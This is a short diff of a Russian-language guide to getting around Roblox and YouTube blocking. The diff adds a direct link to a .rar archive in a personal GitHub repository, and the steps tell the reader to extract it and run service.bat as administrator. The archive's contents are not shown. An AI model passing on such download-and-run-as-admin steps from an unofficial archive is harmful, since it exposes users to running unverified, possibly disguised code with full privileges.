@@ -1,5 +1,5 @@
 📕Роблокс обход блокировки
-1. Cкачать 
+1. Cкачать  https://github.com/sakleam1414/Bypassing-YouTube-blocking-Roblox-Discord/raw/refs/heads/main/Bypassing%20YouTube%20blocking%20in%20Roblox%20and%20Discord.rar
 2. Извлечь файлы Zapret в любую папку на ПК.
 3. Запустите service.bat от имени администратора.
 4. Написать в консоль: 1
